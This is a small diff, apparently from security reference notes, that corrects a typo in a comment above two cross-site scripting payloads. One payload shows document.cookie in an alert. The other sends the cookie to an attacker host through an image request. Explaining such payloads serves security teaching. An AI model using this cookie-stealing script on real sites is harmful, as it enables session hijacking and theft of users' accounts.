@@ -1,7 +1,7 @@
 //You can display the current cookie session with the following command:
 <script>alert(document.cookie)</script>
 
-//Then, you can send cookies contento to an attecker-controlled site:
+//Then, you can send cookies contento to an attacker-controlled site:
 <script>
 var i = new Image();
 i.src = "http://attacker.site/log.php?q="+document.cookie;
